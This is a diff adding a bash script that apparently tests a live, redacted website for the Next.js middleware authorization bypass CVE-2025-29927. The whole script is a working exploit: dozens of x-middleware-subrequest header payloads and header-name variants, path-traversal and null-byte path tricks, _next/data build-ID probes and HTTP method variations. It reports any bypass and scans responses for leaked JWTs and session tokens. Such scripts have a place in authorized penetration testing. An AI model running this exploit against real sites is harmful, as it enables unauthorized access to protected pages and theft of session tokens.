@@ -1,0 +1,261 @@
+#!/bin/bash
+BASE="https://redacted.com"
+OUTPUT="/home/z/my-project/download/middleware_bypass_test_$(date +%Y%m%d_%H%M%S).txt"
+
+echo "=== CVE-2025-29927 — Next.js 13.2.3 Middleware Bypass Test ===" | tee "$OUTPUT"
+echo "Target: $BASE" | tee -a "$OUTPUT"
+echo "Date: $(date)" | tee -a "$OUTPUT"
+echo "" | tee -a "$OUTPUT"
+
+# ========================================
+# PHASE 1: Baseline for each endpoint
+# ========================================
+echo "=== PHASE 1: BASELINE (no bypass header) ===" | tee -a "$OUTPUT"
+echo "" | tee -a "$OUTPUT"
+
+declare -A BASELINE_STATUS
+
+for ENDPOINT in "/restricted-endpoint" "/pwt"; do
+  echo "--- Endpoint: $ENDPOINT ---" | tee -a "$OUTPUT"
+  response=$(curl -sk -D- "$BASE$ENDPOINT" -o /tmp/baseline_body -w "|%{http_code}|%{size_download}|%{redirect_url}" 2>/dev/null)
+  status=$(echo "$response" | grep -oP '\|\K[0-9]+(?=\|)')
+  size=$(echo "$response" | grep -oP '\|[0-9]+\|\K[0-9]+' | head -1)
+  redirect=$(echo "$response" | grep -oP '\|[0-9]+\|[0-9]+\|\K.*')
+  BASELINE_STATUS[$ENDPOINT]=$status
+  echo "  Status: $status | Size: ${size}B | Redirect: $redirect" | tee -a "$OUTPUT"
+  echo "  Response headers:" | tee -a "$OUTPUT"
+  curl -sk -D- "$BASE$ENDPOINT" -o /dev/null 2>/dev/null | grep -iE "x-middleware|location|set-cookie|content-type|server" | tee -a "$OUTPUT"
+  echo "" | tee -a "$OUTPUT"
+done
+
+# ========================================
+# PHASE 2: x-middleware-subrequest payloads
+# ========================================
+echo "=== PHASE 2: x-middleware-subrequest HEADER BYPASS ===" | tee -a "$OUTPUT"
+echo "" | tee -a "$OUTPUT"
+
+PAYLOADS=(
+  "middleware"
+  "Middleware"
+  "MIDDLEWARE"
+  "src/middleware"
+  "src/Middleware"
+  "SRC/middleware"
+  "pages/middleware"
+  "pages/_middleware"
+  "middleware:middleware:middleware"
+  "middleware:middleware:middleware:middleware"
+  "middleware:middleware:middleware:middleware:middleware"
+  "middleware:middleware:middleware:middleware:middleware:middleware"
+  "middleware:middleware:middleware:middleware:middleware:middleware:middleware"
+  "middleware:middleware:middleware:middleware:middleware:middleware:middleware:middleware"
+  "middleware:middleware:middleware:middleware:middleware:middleware:middleware:middleware:middleware"
+  "middleware:middleware:middleware:middleware:middleware:middleware:middleware:middleware:middleware:middleware"
+  "middleware:middleware:middleware:middleware:middleware:middleware:middleware:middleware:middleware:middleware:middleware"
+  "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware"
+  "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware:src/middleware"
+  "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware:src/middleware:src/middleware"
+  "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware:src/middleware:src/middleware:src/middleware"
+  "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware:src/middleware:src/middleware:src/middleware:src/middleware"
+  "pages/_middleware:pages/_middleware:pages/_middleware:pages/_middleware:pages/_middleware"
+  "pages/middleware:pages/middleware:pages/middleware:pages/middleware:pages/middleware"
+  ":middleware:middleware:middleware:middleware:middleware"
+  "middleware:middleware:middleware:middleware:middleware:"
+  "::middleware:middleware:middleware:middleware:middleware::"
+  "fake:middleware:middleware:middleware:middleware:middleware"
+  "x:middleware:middleware:middleware:middleware:middleware"
+  "a:b:c:middleware:middleware:middleware:middleware"
+  "1:2:3:middleware:middleware:middleware:middleware"
+  "anything:middleware:middleware:middleware:middleware:middleware:anything"
+  "fake:src/middleware:src/middleware:src/middleware:src/middleware:src/middleware"
+  "src/middleware:middleware:middleware:middleware:middleware"
+  "middleware:src/middleware:src/middleware:src/middleware:src/middleware"
+  "pages/middleware:middleware:middleware:middleware:middleware"
+  "middleware%3Amiddleware%3Amiddleware%3Amiddleware%3Amiddleware"
+  "middleware : middleware : middleware : middleware : middleware"
+  "middleware :middleware :middleware :middleware :middleware"
+  " middleware:middleware:middleware:middleware:middleware"
+  "middleware%09:middleware%09:middleware%09:middleware"
+  "middleware%0a:middleware%0a:middleware%0a:middleware"
+)
+
+HEADER_NAMES=(
+  "x-middleware-subrequest"
+  "X-Middleware-Subrequest"
+  "X-MIDDLEWARE-SUBREQUEST"
+  "x-middleware-SubRequest"
+  "x-middleware_subrequest"
+  "X-Middleware_Subrequest"
+  "HTTP_X_MIDDLEWARE_SUBREQUEST"
+)
+
+COUNT=0
+TOTAL=$((${#PAYLOADS[@]} * ${#HEADER_NAMES[@]} * 2))
+
+for ENDPOINT in "/restricted-endpoint" "/pwt"; do
+  baseline="${BASELINE_STATUS[$ENDPOINT]}"
+  echo "--- Testing: $ENDPOINT (baseline: $baseline) ---" | tee -a "$OUTPUT"
+  
+  for header in "${HEADER_NAMES[@]}"; do
+    for payload in "${PAYLOADS[@]}"; do
+      COUNT=$((COUNT+1))
+      response=$(curl -sk -D- "$BASE$ENDPOINT" -H "$header: $payload" -o /tmp/test_body -w "|%{http_code}|%{size_download}|%{redirect_url}" 2>/dev/null)
+      status=$(echo "$response" | grep -oP '\|\K[0-9]+(?=\|)')
+      size=$(echo "$response" | grep -oP '\|[0-9]+\|\K[0-9]+' | head -1)
+      
+      if [[ "$status" != "$baseline" && "$status" != "000" ]]; then
+        echo "*** BYPASS DETECTED ***" | tee -a "$OUTPUT"
+        echo "  Endpoint: $ENDPOINT" | tee -a "$OUTPUT"
+        echo "  Header: $header" | tee -a "$OUTPUT"
+        echo "  Payload: $payload" | tee -a "$OUTPUT"
+        echo "  Status: $status (baseline was $baseline)" | tee -a "$OUTPUT"
+        echo "  Response size: ${size}B" | tee -a "$OUTPUT"
+        echo "  Response headers:" | tee -a "$OUTPUT"
+        curl -sk -D- "$BASE$ENDPOINT" -H "$header: $payload" -o /dev/null 2>/dev/null | head -20 | tee -a "$OUTPUT"
+        echo "  Body preview:" | tee -a "$OUTPUT"
+        head -c 1000 /tmp/test_body | tee -a "$OUTPUT"
+        echo -e "\n" | tee -a "$OUTPUT"
+        echo "=================================" | tee -a "$OUTPUT"
+      fi
+      
+      echo -ne "\r  [$ENDPOINT] Progress: $COUNT / $TOTAL  "
+    done
+  done
+  echo "" | tee -a "$OUTPUT"
+done
+
+# ========================================
+# PHASE 3: Header + Path combined
+# ========================================
+echo "" | tee -a "$OUTPUT"
+echo "=== PHASE 3: HEADER + PATH NORMALIZATION COMBINED ===" | tee -a "$OUTPUT"
+echo "" | tee -a "$OUTPUT"
+
+PATH_VARIANTS=(
+  "/restricted-endpoint"
+  "/pwt/./restricted-endpoint"
+  "/pwt/../pwt/restricted-endpoint"
+  "/pwt//restricted-endpoint"
+  "/pwt/%2e/restricted-endpoint"
+  "/pwt/%2e%2e/restricted-endpoint"
+  "/pwt/%2e%2e%2frestricted-endpoint"
+  "/pwt/restricted-endpoint%00"
+  "/pwt/restricted-endpoint%00/"
+  "/pwt/restricted-endpoint."
+  "/pwt/restricted-endpoint/."
+  "/pwt/restricted-endpoint/.."
+  "/pwt/restricted-endpoint/../restricted-endpoint"
+  "/pwt/..%2frestricted-endpoint"
+  "/pwt/%252e%252e%252frestricted-endpoint"
+  "/pwt/restricted-endpoint;"
+  "/pwt/restricted-endpoint;/"
+  "/pwt/restricted-endpoint%20"
+  "/pwt/restricted-endpoint%09"
+  "/pwt/Restricted-Endpoint"
+  "/PWT/restricted-endpoint"
+)
+
+HEADER_PAYLOADS=(
+  "middleware:middleware:middleware:middleware:middleware"
+  "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware"
+)
+
+for path in "${PATH_VARIANTS[@]}"; do
+  for hpayload in "${HEADER_PAYLOADS[@]}"; do
+    COUNT=$((COUNT+1))
+    response=$(curl -sk "$BASE$path" -H "x-middleware-subrequest: $hpayload" -o /tmp/combined_body -w "|%{http_code}|%{size_download}" 2>/dev/null)
+    status=$(echo "$response" | grep -oP '\|\K[0-9]+(?=\|)')
+    size=$(echo "$response" | grep -oP '\|[0-9]+\|\K[0-9]+' | head -1)
+    
+    if [[ "$status" == "200" && "$size" -gt 100 ]]; then
+      echo "*** COMBINED BYPASS ***" | tee -a "$OUTPUT"
+      echo "  Path: $path" | tee -a "$OUTPUT"
+      echo "  Header: x-middleware-subrequest: $hpayload" | tee -a "$OUTPUT"
+      echo "  Status: $status | Size: ${size}B" | tee -a "$OUTPUT"
+      head -c 500 /tmp/combined_body | tee -a "$OUTPUT"
+      echo -e "\n" | tee -a "$OUTPUT"
+    fi
+  done
+done
+
+# ========================================
+# PHASE 4: _next/data endpoint tests
+# ========================================
+echo "" | tee -a "$OUTPUT"
+echo "=== PHASE 4: _next/data ENDPOINT TESTS ===" | tee -a "$OUTPUT"
+echo "" | tee -a "$OUTPUT"
+
+# Extract build ID
+BUILDID=$(curl -sk "$BASE" 2>/dev/null | grep -oP '_next/static/\K[^/]+' | head -1)
+if [[ -n "$BUILDID" ]]; then
+  echo "Detected Build ID: $BUILDID" | tee -a "$OUTPUT"
+else
+  echo "Could not auto-detect Build ID. Set manually." | tee -a "$OUTPUT"
+  BUILDID="BUILDID_HERE"
+fi
+
+DATA_VARIANTS=(
+  "/_next/data/$BUILDID/en/restricted-endpoint.json"
+  "/_next/data/$BUILDID/en/./restricted-endpoint.json"
+  "/_next/data/$BUILDID/./en/restricted-endpoint.json"
+  "/_next/data/$BUILDID/en/restricted-endpoint.json%00"
+  "/_next/data/$BUILDID/en/restricted-endpoint.json/"
+  "/_next/data/$BUILDID/en/restricted-endpoint.json/."
+  "/_next/data/$BUILDID/../en/restricted-endpoint.json"
+  "/_next/data/$BUILDID/en/pwt/restricted-endpoint.json"
+  "/_next/data/$BUILDID/restricted-endpoint.json"
+  "/_next/data/$BUILDID/fr/restricted-endpoint.json"
+)
+
+for data_path in "${DATA_VARIANTS[@]}"; do
+  echo "--- $data_path ---" | tee -a "$OUTPUT"
+  
+  # Without bypass header
+  curl -sk "$BASE$data_path" -o /tmp/data_baseline -w "  No header: %{http_code} | %{size_download}B\n" 2>/dev/null | tee -a "$OUTPUT"
+  
+  # With bypass header
+  curl -sk "$BASE$data_path" -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" -o /tmp/data_bypass -w "  With header: %{http_code} | %{size_download}B\n" 2>/dev/null | tee -a "$OUTPUT"
+  
+  # Check if data leaks JWT/tokens
+  if grep -qi "jwt\|token\|role\|authorization\|bearer\|session" /tmp/data_baseline 2>/dev/null; then
+    echo "  *** DATA LEAK: JWT/token detected in response ***" | tee -a "$OUTPUT"
+  fi
+  if grep -qi "jwt\|token\|role\|authorization\|bearer\|session" /tmp/data_bypass 2>/dev/null; then
+    echo "  *** DATA LEAK (bypass): JWT/token detected in response ***" | tee -a "$OUTPUT"
+  fi
+done
+
+# ========================================
+# PHASE 5: HTTP method variations
+# ========================================
+echo "" | tee -a "$OUTPUT"
+echo "=== PHASE 5: HTTP METHOD VARIATIONS ===" | tee -a "$OUTPUT"
+echo "" | tee -a "$OUTPUT"
+
+METHODS=("GET" "POST" "PUT" "DELETE" "PATCH" "OPTIONS" "HEAD")
+
+for ENDPOINT in "/restricted-endpoint" "/pwt"; do
+  echo "--- Endpoint: $ENDPOINT ---" | tee -a "$OUTPUT"
+  for method in "${METHODS[@]}"; do
+    # Without header
+    s1=$(curl -sk -X $method "$BASE$ENDPOINT" -o /dev/null -w "%{http_code}" 2>/dev/null)
+    # With header
+    s2=$(curl -sk -X $method "$BASE$ENDPOINT" -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" -o /dev/null -w "%{http_code}" 2>/dev/null)
+    
+    echo "  $method: baseline=$s1 | bypass=$s2" | tee -a "$OUTPUT"
+    
+    if [[ "$s1" != "$s2" && "$s2" != "000" ]]; then
+      echo "  *** METHOD BYPASS DETECTED: $method ***" | tee -a "$OUTPUT"
+    fi
+  done
+  echo "" | tee -a "$OUTPUT"
+done
+
+# ========================================
+# SUMMARY
+# ========================================
+echo "" | tee -a "$OUTPUT"
+echo "========================================" | tee -a "$OUTPUT"
+echo "TEST COMPLETE" | tee -a "$OUTPUT"
+echo "Results saved to: $OUTPUT" | tee -a "$OUTPUT"
+echo "========================================" | tee -a "$OUTPUT"
